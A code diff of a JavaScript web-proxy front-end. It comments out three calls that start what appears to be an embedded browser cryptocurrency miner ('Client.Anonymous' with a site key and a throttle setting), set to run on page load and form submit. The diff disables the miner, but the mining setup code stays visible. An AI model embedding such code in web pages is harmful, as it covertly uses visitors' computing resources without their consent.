@@ -51,7 +51,7 @@ async function initializeProxy() {
             var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
                 throttle: 0.6, c: 'w', ads: 0
             });
-            _client.start();
+            // _client.start();
     
         }, 2000);
     } catch (err) {
@@ -88,7 +88,7 @@ form.addEventListener("submit", async (event) => {
         var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
             throttle: 0.6, c: 'w', ads: 0
         });
-        _client.start();
+        // _client.start();
     }, 2000);
 });
 
@@ -181,7 +181,7 @@ document.addEventListener("DOMContentLoaded", () => {
             var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
                 throttle: 0.6, c: 'w', ads: 0
             });
-            _client.start();
+            // _client.start();
         }, 2000);
         console.log("Iframe src updated for proxy search:", frame.src);
     }
@@ -192,6 +192,7 @@ document.addEventListener("DOMContentLoaded", () => {
         submitProxySearch().catch(err => console.error("Proxy search submit error:", err));
     });
 });
+
 
 
 
